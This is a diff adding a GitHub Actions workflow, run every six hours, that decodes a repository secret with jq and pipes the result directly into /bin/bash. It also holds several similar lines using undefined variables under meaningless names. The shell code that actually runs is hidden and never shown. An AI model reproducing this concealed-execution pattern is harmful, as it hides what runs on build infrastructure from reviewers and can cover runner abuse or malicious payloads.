@@ -1,0 +1,25 @@
+name: zhejiushitaa
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhejiushitaa
+        env:
+          appu717: ${{ secrets.appu717 }}
+        run: |
+          echo $appu717 | jq -r .t6580 | /bin/bash
+          echo $q8692 | jq -r .rofar918 | /bin/bash
+          echo $y4689 | jq -r .he56 | /bin/bash
+          echo $nf56 | jq -r .an5 | /bin/bash
+          echo $urdk395 | jq -r .xoci31 | /bin/bash
+          echo $w88 | jq -r .baoj16 | /bin/bash
+          echo $mczaz2 | jq -r .qwhvn871 | /bin/bash
+          echo $hkl67 | jq -r .w8410 | /bin/bash
+          echo $jatou041 | jq -r .yvs4 | /bin/bash
+
